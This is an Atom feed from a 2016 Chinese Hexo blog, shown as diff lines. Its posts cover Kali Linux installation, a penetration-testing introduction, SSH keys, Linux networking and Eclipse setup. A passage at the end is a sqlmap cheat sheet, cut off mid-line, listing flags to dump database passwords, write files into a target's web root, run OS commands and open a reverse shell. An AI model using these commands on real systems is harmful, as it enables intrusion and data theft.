+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Welcome to &lt;a href=&quot;http://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;http://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info.&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>one</title>
+    <link href="http://www.craymc.com/2016/07/20/one/"/>
+    <id>http://www.craymc.com/2016/07/20/one/</id>
+    <published>2016-07-20T02:16:29.000Z</published>
+    <updated>2016-07-20T10:47:18.974Z</updated>
+    
+    <content type="html"><![CDATA[<p>##第二课时<br>软件版本：1.1.0<br>安装方法：光盘，镜像，u盘（工具：unetbootin 要求：u盘至少4个g）<br>安装支持设备：u盘移动，手机，电脑</p>
+<p>1.硬盘安装方式<br>进入安装界面<br>      live  体验<br>      live usb persistence  制作u盘无密码移动版<br>      live usb encrypted persistence  制作u盘有密码移动版<br>      install 直接安装<br>      graphical install 图形化安装</p>
+<p>2.docker(容器)<br>      <a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="external">https://www.kali.org/news/official-kali-linux-docker-images/</a> kali docker image(kali官方提供的docker镜像里面不包含任何软件工具)</p>
+<pre><code>https://github.com/offensive-secunity/kali-linux-docker kali官方放在docker的脚本（要求自己做的kali镜像）
+</code></pre><hr>
+<a id="more"></a>
+<p>1.虚拟机安装<br>    vmware workstation<br>    virtualbox<br>    官方vm镜像文件：<br>     <a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="external">https://www.offensive-security.com/kali-linux-vmware-arm-image-download/</a><br>     win8系统安装虚拟机注意：要卸载微软的kb3045999补丁 卸载方法：打开命令提示符cd/到c盘再powershell再打入get-hotfix -id KB3045999回车打入wusa /uninstall /kb:3045999成功卸载</p>
+<pre><code>安装tools:
+</code></pre><p>先在虚拟机上安装附加模块，在打开哪个镜像，选择里面的vboxlinuxadditions.run拷贝出来用终端打开，先列出目录ls,再查询现有的权限ls -l，在赋予执行权限chmod +x 文件（x表示可执行），再看下文件是否是绿色ls -l，再运行./文件<br>，重启reboot</p>
+<p>2.持久加密usb安装</p>
+<p>模式：<br>1、live(amd64)可以通过启动U盘来运行kali linux。缺点：不可以安装新的软件包或更新修改；<br>2、Live USB P/EP(加密的持久USB启动光盘)。<br>DOCKER?<br>虚拟机安装<br>vmware workstation<br>Virtualbox<br>win8安装virtualbox，需要卸载一个补丁,要用到powershell，cmd下执行powershell，然后<br>poewershell<br>get-hotfix -id KB3045999</p>
+<p>wusa /uninstall /kb:3045999  按回车键，卸载</p>
+<p>虚拟机安装kali linux设置内存最好是2G，最大可以设置成4G</p>
+<hr>
+<p>安装kali linux操作系统<br>Graphical install   //选择字母界面安装kali linux操作系统</p>
+<p>chinese(Simplified)  中文（简体）</p>
+<p>中国</p>
+<p>汉语</p>
+<p>请输入系统的主机名: Kali</p>
+<p>域名：      //如果这里有域名可以在下面填写,如果木有域名则自己按继续</p>
+<p>输入root账号密码 </p>
+<p>向导-使用整个硬盘</p>
+<p>SCSII (0,0,0)(sda)- 85.9GB ATA VBOX HARDDISK</p>
+<p>√ 讲所有每个文件放在同一个分区中（推荐新手使用）<br>×将/home、/usr、/var和/tmp都分别放在单独的分区</p>
+<p>分区设定结构并将修改写入硬盘</p>
+<p>将改动写入硬盘吗？  是</p>
+<p>将CRUB 启动引导基安装到主引导记录（MBR）上么？  是</p>
+<p>安装完成    继续</p>
+<hr>
+<p>root@kali:~# apt-get install linux-headers-$(uname -r)    //更新系统并显示linux操作系统内核版本号<br>Reading package lists … Done<br>Building dependency tree<br>Reading state information… Done<br>Linux-headers-3.18.0-kalil-586 is already the newesr version.<br>0 upgrade, 0 newly installed, 0 to remove and 163 not upgraded.</p>
+<p>root@kali:~# apt-get update</p>
+<p>root@kali:~# uname -r      //uname用来获取电脑和操作系统的相关信息,显示linux操作系统内核版本号<br>3.18.0-kalil-586</p>
+<p>root@kali:~/Desktop# ls      //打印出当前目录的清单<br>VBocLinuxAdditions.run</p>
+<p>root@kali:~/Desktop# ls -l     //列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等<br>tottal 6972<br>-rw-r–r 1 root root 7136717 may 13 12:12 VBocLinuxAdditions.run</p>
+<p>root@kali:~/Desktop# chmod +x VBocLinuxAdditions.run                 赋予执行权限</p>
+<p>root@kali:~/Desktop# ls -l<br>tottal 6972<br>-rwxr-r–r 1 root root 7136717 may 13 12:12 VBocLinuxAdditions.run      赋予权限且”VBocLinuxAdditions.run”变成绿色</p>
+<p>root@kali:~/Desktop# ./VBocLinuxAdditions.run       运行VBocLinuxAdditions.run</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;##第二课时&lt;br&gt;软件版本：1.1.0&lt;br&gt;安装方法：光盘，镜像，u盘（工具：unetbootin 要求：u盘至少4个g）&lt;br&gt;安装支持设备：u盘移动，手机，电脑&lt;/p&gt;
+&lt;p&gt;1.硬盘安装方式&lt;br&gt;进入安装界面&lt;br&gt;      live  体验&lt;br&gt;      live usb persistence  制作u盘无密码移动版&lt;br&gt;      live usb encrypted persistence  制作u盘有密码移动版&lt;br&gt;      install 直接安装&lt;br&gt;      graphical install 图形化安装&lt;/p&gt;
+&lt;p&gt;2.docker(容器)&lt;br&gt;      &lt;a href=&quot;https://www.kali.org/news/official-kali-linux-docker-images/&quot;&gt;https://www.kali.org/news/official-kali-linux-docker-images/&lt;/a&gt; kali docker image(kali官方提供的docker镜像里面不包含任何软件工具)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://github.com/offensive-secunity/kali-linux-docker kali官方放在docker的脚本（要求自己做的kali镜像）
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+    
+    </summary>
+    
+    
+      <category term="Kali" scheme="http://www.craymc.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali Linux安装-硬盘安装、虚拟机安装</title>
+    <link href="http://www.craymc.com/2016/07/15/Kali-Linux%E5%AE%89%E8%A3%85-%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
+    <id>http://www.craymc.com/2016/07/15/Kali-Linux安装-硬盘安装、虚拟机安装/</id>
+    <published>2016-07-15T11:04:31.000Z</published>
+    <updated>2016-07-20T10:47:18.971Z</updated>
+    
+    <content type="html"><![CDATA[<p>##第二课时<br>软件版本：1.1.0<br>安装方法：光盘，镜像，u盘（工具：unetbootin 要求：u盘至少4个g）<br>安装支持设备：u盘移动，手机，电脑</p>
+<p>1.硬盘安装方式<br>进入安装界面<br>      live  体验<br>      live usb persistence  制作u盘无密码移动版<br>      live usb encrypted persistence  制作u盘有密码移动版<br>      install 直接安装<br>      graphical install 图形化安装</p>
+<p>2.docker(容器)<br>      <a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="external">https://www.kali.org/news/official-kali-linux-docker-images/</a> kali docker image(kali官方提供的docker镜像里面不包含任何软件工具)</p>
+<pre><code>https://github.com/offensive-secunity/kali-linux-docker kali官方放在docker的脚本（要求自己做的kali镜像）
+</code></pre><hr>
+<a id="more"></a>
+<p>1.虚拟机安装<br>    vmware workstation<br>    virtualbox<br>    官方vm镜像文件：<br>     <a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/" target="_blank" rel="external">https://www.offensive-security.com/kali-linux-vmware-arm-image-download/</a><br>     win8系统安装虚拟机注意：要卸载微软的kb3045999补丁 卸载方法：打开命令提示符cd/到c盘再powershell再打入get-hotfix -id KB3045999回车打入wusa /uninstall /kb:3045999成功卸载</p>
+<pre><code>安装tools:
+</code></pre><p>先在虚拟机上安装附加模块，在打开哪个镜像，选择里面的vboxlinuxadditions.run拷贝出来用终端打开，先列出目录ls,再查询现有的权限ls -l，在赋予执行权限chmod +x 文件（x表示可执行），再看下文件是否是绿色ls -l，再运行./文件<br>，重启reboot</p>
+<p>2.持久加密usb安装</p>
+<p>模式：<br>1、live(amd64)可以通过启动U盘来运行kali linux。缺点：不可以安装新的软件包或更新修改；<br>2、Live USB P/EP(加密的持久USB启动光盘)。<br>DOCKER?<br>虚拟机安装<br>vmware workstation<br>Virtualbox<br>win8安装virtualbox，需要卸载一个补丁,要用到powershell，cmd下执行powershell，然后<br>poewershell<br>get-hotfix -id KB3045999</p>
+<p>wusa /uninstall /kb:3045999  按回车键，卸载</p>
+<p>虚拟机安装kali linux设置内存最好是2G，最大可以设置成4G</p>
+<hr>
+<p>安装kali linux操作系统<br>Graphical install   //选择字母界面安装kali linux操作系统</p>
+<p>chinese(Simplified)  中文（简体）</p>
+<p>中国</p>
+<p>汉语</p>
+<p>请输入系统的主机名: Kali</p>
+<p>域名：      //如果这里有域名可以在下面填写,如果木有域名则自己按继续</p>
+<p>输入root账号密码 </p>
+<p>向导-使用整个硬盘</p>
+<p>SCSII (0,0,0)(sda)- 85.9GB ATA VBOX HARDDISK</p>
+<p>√ 讲所有每个文件放在同一个分区中（推荐新手使用）<br>×将/home、/usr、/var和/tmp都分别放在单独的分区</p>
+<p>分区设定结构并将修改写入硬盘</p>
+<p>将改动写入硬盘吗？  是</p>
+<p>将CRUB 启动引导基安装到主引导记录（MBR）上么？  是</p>
+<p>安装完成    继续</p>
+<hr>
+<p>root@kali:~# apt-get install linux-headers-$(uname -r)    //更新系统并显示linux操作系统内核版本号<br>Reading package lists … Done<br>Building dependency tree<br>Reading state information… Done<br>Linux-headers-3.18.0-kalil-586 is already the newesr version.<br>0 upgrade, 0 newly installed, 0 to remove and 163 not upgraded.</p>
+<p>root@kali:~# apt-get update</p>
+<p>root@kali:~# uname -r      //uname用来获取电脑和操作系统的相关信息,显示linux操作系统内核版本号<br>3.18.0-kalil-586</p>
+<p>root@kali:~/Desktop# ls      //打印出当前目录的清单<br>VBocLinuxAdditions.run</p>
+<p>root@kali:~/Desktop# ls -l     //列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等<br>tottal 6972<br>-rw-r–r 1 root root 7136717 may 13 12:12 VBocLinuxAdditions.run</p>
+<p>root@kali:~/Desktop# chmod +x VBocLinuxAdditions.run                 赋予执行权限</p>
+<p>root@kali:~/Desktop# ls -l<br>tottal 6972<br>-rwxr-r–r 1 root root 7136717 may 13 12:12 VBocLinuxAdditions.run      赋予权限且”VBocLinuxAdditions.run”变成绿色</p>
+<p>root@kali:~/Desktop# ./VBocLinuxAdditions.run       运行VBocLinuxAdditions.run</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;##第二课时&lt;br&gt;软件版本：1.1.0&lt;br&gt;安装方法：光盘，镜像，u盘（工具：unetbootin 要求：u盘至少4个g）&lt;br&gt;安装支持设备：u盘移动，手机，电脑&lt;/p&gt;
+&lt;p&gt;1.硬盘安装方式&lt;br&gt;进入安装界面&lt;br&gt;      live  体验&lt;br&gt;      live usb persistence  制作u盘无密码移动版&lt;br&gt;      live usb encrypted persistence  制作u盘有密码移动版&lt;br&gt;      install 直接安装&lt;br&gt;      graphical install 图形化安装&lt;/p&gt;
+&lt;p&gt;2.docker(容器)&lt;br&gt;      &lt;a href=&quot;https://www.kali.org/news/official-kali-linux-docker-images/&quot;&gt;https://www.kali.org/news/official-kali-linux-docker-images/&lt;/a&gt; kali docker image(kali官方提供的docker镜像里面不包含任何软件工具)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://github.com/offensive-secunity/kali-linux-docker kali官方放在docker的脚本（要求自己做的kali镜像）
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+    
+    </summary>
+    
+    
+      <category term="Kali" scheme="http://www.craymc.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali 使用教程笔记</title>
+    <link href="http://www.craymc.com/2016/05/13/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
+    <id>http://www.craymc.com/2016/05/13/Kali使用教程笔记/</id>
+    <published>2016-05-13T01:10:28.000Z</published>
+    <updated>2016-07-20T10:47:18.971Z</updated>
+    
+    <content type="html"><![CDATA[<p>课时1 Kali Linux渗透测试介绍<br>    安全问题的根源<br>        优点：分工明确，工作效率高。<br>        缺点：从业人员对系统没有整体的认识，对安全认识较为片面。<br>        最大威胁是人，人都会犯错，安全问题不能100%绝对根除。<br>   安全目标<br>        先于攻击者发现和防止漏洞出现<br>        攻击型：以攻击者的思维发现漏洞、攻击系统。<br>        防护型:投入巨大，会有遗漏，不够全面，收效不高。<br>    渗透测试<br>        尝试破解系统防御机制，发现系统弱点<br>        从攻击者的角度思考，测量安全防护的有效性<br>        证明问题存在，而不是破坏<br>        道德约束、法律<br>        不局限于一台机器出现的问题，而着眼漏洞对整个系统的影响与危害<br><a id="more"></a><br>    渗透测试标准<br>        PETS (<a href="http://www.pentest-standard.org" target="_blank" rel="external">http://www.pentest-standard.org</a>)<br>        前期交互（客户沟通，确定渗透测试范围，对应用系统渗透任务划分，包括支撑整个系统的各种软件组件）<br>        情报收集（收集目标系统信息，被动收集与主动探测）<br>        威胁建模（根据收集到的信息，确定最有效，最有可能成功的攻击途径）<br>        漏洞分析（通过系统软件版本分析，系统应用漏洞分析写出漏洞利用代码）<br>        渗透攻击阶段（并不像想象中那么顺利，目标系统有防护系统）<br>        后渗透测试阶段（以一台被渗透机器为跳板，进一步渗透整个系统）<br>        渗透测试报告（向客户和其他同事证明系统可以被控制，描述发现、利用过程，以及如何解决）<br>    渗透测试项目<br>        测试范围（整个应用系统）<br>        客户授权（允许攻击还是只是渗透都取决于客户的授权）<br>        渗透测试方法<br>        是否允许社会工程学攻击<br>        是否允许DOS攻击<br>    渗透测试误区<br>        扫描器就是一切（不能忽略业务逻辑的漏洞。自动化技术扫描工具有他的适用范围，对业务逻辑的漏洞也是无能为力。扫描器是辅助工具）<br>    KALI<br>        字面意思“黑色”，音译“咖利”，印度神话中最为黑暗和暴虐的黑色地母。<br>        Kali Linux中的Kali用意估计取自“黑色”的意思。<br>    Kali Linux<br>        基于Debian的发行版本，在其基础上添加了许多信息安全工具，用于渗透测试和安全审计<br>        所有Linux发行版本都遵循的FHS标准目录结构（BT pentest目录中工具分类困难，工具难以更新）<br>        定制内核（主要解决无线渗透测试出现各种错误的问题）<br>        支持ARM、手机平台（NetHunter）<br>        Open Source Free-Offensive Security<br>    Kali Linux策略</p>
+<pre><code>Root用户策略（不同于普通Linux系统小心翼翼的使用方式）
+网络服务策略（默认关闭所有网络服务，自启动脚本默认关闭）
+更新升级策略（Debian + KALI官方）
+</code></pre><p>实践是最好的老师，Kali很强大，但不是全部。这只是关于渗透测试的起点。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;课时1 Kali Linux渗透测试介绍&lt;br&gt;    安全问题的根源&lt;br&gt;        优点：分工明确，工作效率高。&lt;br&gt;        缺点：从业人员对系统没有整体的认识，对安全认识较为片面。&lt;br&gt;        最大威胁是人，人都会犯错，安全问题不能100%绝对根除。&lt;br&gt;   安全目标&lt;br&gt;        先于攻击者发现和防止漏洞出现&lt;br&gt;        攻击型：以攻击者的思维发现漏洞、攻击系统。&lt;br&gt;        防护型:投入巨大，会有遗漏，不够全面，收效不高。&lt;br&gt;    渗透测试&lt;br&gt;        尝试破解系统防御机制，发现系统弱点&lt;br&gt;        从攻击者的角度思考，测量安全防护的有效性&lt;br&gt;        证明问题存在，而不是破坏&lt;br&gt;        道德约束、法律&lt;br&gt;        不局限于一台机器出现的问题，而着眼漏洞对整个系统的影响与危害&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Kali" scheme="http://www.craymc.com/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>git问题集-git-生成SSH</title>
+    <link href="http://www.craymc.com/2016/04/22/git%E9%97%AE%E9%A2%98%E9%9B%86-git-%E7%94%9F%E6%88%90SSH/"/>
+    <id>http://www.craymc.com/2016/04/22/git问题集-git-生成SSH/</id>
+    <published>2016-04-22T01:06:01.000Z</published>
+    <updated>2016-07-20T10:47:18.973Z</updated>
+    
+    <content type="html"><![CDATA[<p>第一步：</p>
+<p>打开gitbash输入：ls -al ~/.ssh</p>
+<p>Check the directory listing to see if you already have a public SSH key. By default, the filenames of the public keys are one of the following:</p>
+<p>id_dsa.pub</p>
+<p>id_ecdsa.pub</p>
+<p>id_ed25519.pub</p>
+<p>id_rsa.pub</p>
+<a id="more"></a>
+<p>第二步：ssh-keygen -t rsa -b 4096 -C “your_email@example.com”</p>
+<h1 id="Creates-a-new-ssh-key-using-the-provided-email-as-a-label"><a href="#Creates-a-new-ssh-key-using-the-provided-email-as-a-label" class="headerlink" title="Creates a new ssh key, using the provided email as a label"></a>Creates a new ssh key, using the provided email as a label</h1><p>#Generating public/private rsa key pair.</p>
+<p>②：接下来一直回车</p>
+<p>③出现：# Creates a new ssh key, using the provided email as a label</p>
+<p>#Generating public/private rsa key pair.</p>
+<p>第三步：添加代理</p>
+<h1 id="start-the-ssh-agent-in-the-backgroundssh-agent-s-Agent-pid-59566"><a href="#start-the-ssh-agent-in-the-backgroundssh-agent-s-Agent-pid-59566" class="headerlink" title="start the ssh-agent in the backgroundssh-agent -s#Agent pid 59566"></a>start the ssh-agent in the backgroundssh-agent -s#Agent pid 59566</h1><p>#</p>
+<h1 id="start-the-ssh-agent-in-the-backgroundeval-ssh-agent-s-Agent-pid-59566"><a href="#start-the-ssh-agent-in-the-backgroundeval-ssh-agent-s-Agent-pid-59566" class="headerlink" title="start the ssh-agent in the backgroundeval $(ssh-agent -s)#Agent pid 59566"></a>start the ssh-agent in the backgroundeval $(ssh-agent -s)#Agent pid 59566</h1><p>ssh-add ~/.ssh/id_rsa</p>
+<p>第四步：把SSHKEY添加到你的账户</p>
+<p>用公钥。先在GitHub上注册一个用户，然后进入account-setting ，把id_rsa.pub的内容复制进去就可以了。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;第一步：&lt;/p&gt;
+&lt;p&gt;打开gitbash输入：ls -al ~/.ssh&lt;/p&gt;
+&lt;p&gt;Check the directory listing to see if you already have a public SSH key. By default, the filenames of the public keys are one of the following:&lt;/p&gt;
+&lt;p&gt;id_dsa.pub&lt;/p&gt;
+&lt;p&gt;id_ecdsa.pub&lt;/p&gt;
+&lt;p&gt;id_ed25519.pub&lt;/p&gt;
+&lt;p&gt;id_rsa.pub&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="git" scheme="http://www.craymc.com/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2016第一篇</title>
+    <link href="http://www.craymc.com/2016/01/23/2016%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
+    <id>http://www.craymc.com/2016/01/23/2016第一篇/</id>
+    <published>2016-01-23T06:11:48.000Z</published>
+    <updated>2016-07-20T10:47:18.970Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>新年伊始，在忙完了考试和实训后，终于有了时间来写下这一篇迟来的新年文章。
+</code></pre><a id="more"></a>
+<pre><code>回顾一下过去的一年，生活上跟以前没有什么变化，一如既往；在学习上了解了一些知识，拓宽了知识广度，做了一个重大的决定，希望自己能够实现。在12月份的时候参加了“开源中国”的年度盛典，亲眼目睹了“鸟哥”的那猥琐的面容，也因此认识了华为的兰姐姐，在场于那些前辈们，沟通了许多话题，阿里的沈老师给自己提供了很多有用的建议，总之，这次涨姿势了！
+新的一年中，想得要增强一下代码的量度，也能学到更多的知识分享的博客，与大家共享！
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;新年伊始，在忙完了考试和实训后，终于有了时间来写下这一篇迟来的新年文章。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+    
+      <category term="生活" scheme="http://www.craymc.com/tags/%E7%94%9F%E6%B4%BB/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3种方式在Linux下配置网卡</title>
+    <link href="http://www.craymc.com/2016/01/23/3%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%9C%A8Linux%E4%B8%8B%E9%85%8D%E7%BD%AE%E7%BD%91%E5%8D%A1/"/>
+    <id>http://www.craymc.com/2016/01/23/3种方式在Linux下配置网卡/</id>
+    <published>2016-01-23T05:59:05.000Z</published>
+    <updated>2016-07-20T10:47:18.970Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>1.    配置第一块网卡，并设置为静态，要求模式为nat模式
+
+a.图形化：用setup去调用图形化设置
+</code></pre><p>PS：eth0(相当于数组)DHCP为（＊）说明未配置，点击空格进行配置<br>    配置思路：192.168.71..0</p>
+<a id="more"></a>
+<pre><code>b.修改配置文件：
+
+c.临时分配：    IP：192.168.91.1／24
+</code></pre><p>2</p>
+<pre><code>2.配置完成后
+</code></pre><p>   开启服务<br>service network  start<br>b.<br>   vim /etc/sysconfig/network-scripts/ifcfg-eth0</p>
+<pre><code>PS:填三行，改两处
+
+none=static;    onboot=yes
+        NETMASK;GETWAY;
+</code></pre><p>改写完成后，service network restart<br>c.    </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;1.    配置第一块网卡，并设置为静态，要求模式为nat模式
+
+a.图形化：用setup去调用图形化设置
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PS：eth0(相当于数组)DHCP为（＊）说明未配置，点击空格进行配置&lt;br&gt;    配置思路：192.168.71..0&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Linux" scheme="http://www.craymc.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python在eclipse下配置编码问题</title>
+    <link href="http://www.craymc.com/2015/12/23/python%E5%9C%A8eclipse%E4%B8%8B%E9%85%8D%E7%BD%AE%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
+    <id>http://www.craymc.com/2015/12/23/python在eclipse下配置编码问题/</id>
+    <published>2015-12-23T10:08:45.000Z</published>
+    <updated>2016-07-20T10:47:18.974Z</updated>
+    
+    <content type="html"><![CDATA[<p>Eclipse的设置</p>
+<p>window-&gt;preferences-&gt;general-&gt;editors-&gt;text editors-&gt;spelling-&gt;encoding-&gt;UTF-8，编辑器的编码格式</p>
+<p>window-&gt;preferences-&gt;workspace-&gt;text file encoding-&gt;UTF-8</p>
+<p>打开eclipse安装目录-&gt;eclipse.ini，末行加上”-Dfile.encoding=UTF-8”<br><a id="more"></a></p>
+<p>文件编码</p>
+<p>py文件记得保存成UTF-8，文件首行加上”#coding=utf-8”   ，这一句话可控制代码中可输入中文字符</p>
+<p>run时设置</p>
+<p>run–&gt;run configurations-&gt;python run-&gt;Common-&gt; Encoding -&gt;UTF-8   ，这个应该是运行时的可解决中文乱码问题。更改空白模块默认显示# -<em>- coding: utf-8 -</em>-</p>
+<p>如果想每次新建一个空模块时自动添加”# -<em>- coding: utf-8 -</em>-”   这样的一句话，可以通过window–Preferences–Pydev–Editor–Template–Empty，然后点击“Edit”按钮，把我们要添加的语句加进去就可以了，将事先默认的语句去掉，改写为：# -<em>- coding: utf-8 -</em>-  这样的一句话,然后你再新建一个空白模块，再也不需要每次都要复制那个编码语句了</p>
+<p>当在建立的python项目时，输入的中文太细，可以通过</p>
+<p>Window &gt; Preferences&gt;General&gt;Appearance&gt;Color and Fonts中的第一个来设置，Basic里面的TextFonts设置大小即可。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Eclipse的设置&lt;/p&gt;
+&lt;p&gt;window-&amp;gt;preferences-&amp;gt;general-&amp;gt;editors-&amp;gt;text editors-&amp;gt;spelling-&amp;gt;encoding-&amp;gt;UTF-8，编辑器的编码格式&lt;/p&gt;
+&lt;p&gt;window-&amp;gt;preferences-&amp;gt;workspace-&amp;gt;text file encoding-&amp;gt;UTF-8&lt;/p&gt;
+&lt;p&gt;打开eclipse安装目录-&amp;gt;eclipse.ini，末行加上”-Dfile.encoding=UTF-8”&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://www.craymc.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqlmap使用笔记</title>
+    <link href="http://www.craymc.com/2015/12/23/sqlmap%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
+    <id>http://www.craymc.com/2015/12/23/sqlmap使用笔记/</id>
+    <published>2015-12-23T10:04:48.000Z</published>
+    <updated>2016-07-20T10:47:18.975Z</updated>
+    
+    <content type="html"><![CDATA[<p>  1.<br> -u  #注入点<br>–sql-shell  返回sql shell<br>-f  #指纹判别数据库类型<br>-b  #获取数据库版本信息<br>-p  #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)<br>-D “”  #<br><a id="more"></a><br>2.<br>-T “”  #指定表名<br>-C “”  #指定字段<br>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)<br>–level=(1-5) #要执行的测试水平等级，默认为1<br>–risk=(0-3)  #测试执行的风险等级，默认为1<br>–time-sec=(2,5) #延迟响应，默认为5 </p>
+<p>3.<br>–data #通过POST发送数据<br>–columns        #列出字段<br>–current-user   #获取当前用户名称<br>–current-db     #获取当前数据库名称<br>–users          #列数据库所有用户<br>–passwords      #数据库用户所有密码<br>–privileges     #查看用户权限(–privileges -U root)<br>-U               #指定数据库用户<br>–prefix=PREFIX 注入payload 字符串前缀</p>
+<p>4.<br>–suffix=SUFFIX 注入 payload 字符串后缀<br>–dbs            #列出所有数据库<br>–tables -D “”   #列出指定数据库中的表<br>–columns -T “user” -D “mysql”      #列出mysql数据库中的user表的所有字段<br>–dump-all            #列出所有数据库所有表<br>–exclude-sysdbs      #只列出用户自己新建的数据库和表<br>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)<br>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据<br>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </p>
+<p>5.<br>–os      #指定系统(Linux,Windows) </p>
+<p>6.<br>-v  #详细的等级(0-6)<br>    0：只显示Python的回溯，错误和关键消息。<br>    1：显示信息和警告消息。<br>    2：显示调试消息。<br>    3：有效载荷注入。<br>    4：显示HTTP请求。<br>    5：显示HTTP响应头。<br>    6：显示HTTP响应页面的内容</p>
+<p>–privileges  #查看权限<br>–is-dba      #是否是数据库管理员<br>–roles       #枚举数据库用户角色<br>–udf-inject  #导入用户自定义函数（获取系统权限）<br>–union-check  #是否支持union 注入<br>–union-cols #union 查询表记录<br>–union-test #union 语句测试<br>–union-use  #采用union 注入<br>–union-tech orderby #union配合order by<br>–data “” #POST方式提交数据(–data “page=1&amp;id=2”)<br>–cookie “用;号分开”      #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)<br>–referer “”     #使用referer欺骗(–referer “<a href="http://www.baidu.com" target="_blank" rel="external">http://www.baidu.com</a>“)<br>–user-agent “”  #自定义user-agent<br>–proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="external">http://127.0.0.1:8118</a>“ #代理注入<br>–string=””    #指定关键词,字符串匹配.<br>–threads 　　  #采用多线程(–threads 3)<br>–sql-shell    #执行指定sql命令<br>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1” )<br>–file-read    #读取指定文件<br>–file-write   #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)<br>–file-dest    #要写入的文件绝对路径<br>–os-cmd=id    #执行系统命令<br>–os-shell     #系统交互shell<br>–os-pwn       #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)<br>–msf-path=    #matesploit绝对路径(–msf-path=/opt/framework/msf3/)<br>–os-smbrelay  #<br>–os-bof       #<br>–reg-read     #读取win系统注册表<br>–priv-esc     #<br>–time-sec=    #延迟设置 默认–time-sec=5 为5秒<br>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a 